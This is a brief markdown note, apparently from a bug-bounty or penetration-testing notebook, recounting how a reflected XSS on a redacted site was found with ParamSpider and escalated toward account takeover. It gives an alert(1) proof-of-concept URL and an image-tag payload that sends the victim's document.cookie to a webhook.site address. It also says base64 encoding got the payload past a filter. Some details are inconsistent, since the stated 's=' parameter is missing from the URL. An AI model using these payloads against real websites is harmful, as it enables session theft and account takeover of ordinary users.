---
title: XSS to ATO
draft: false
tags:
  - xss
  - ato
  - paramspider
---
Use Param Spider to gather all possible parameters:


```
param spider -d jp.redacted.com -s  (to list in the terminal all possible parameters
```

Above found a parameter `s=`, which allowed to execute Reflected XSS with a simple payload:

```
https://jp.redacted.com/?=<script>alert(1)</script>
```

Attempting to steal cookie failed:

```
<img src=onerror='document.location=%27https://webhook.site/790fbd5e-8cc4-441e-9a81-6ac18f40cb5f?c=%27+document.cookie;"'>
```

However, `base64` encoding the payload worked. 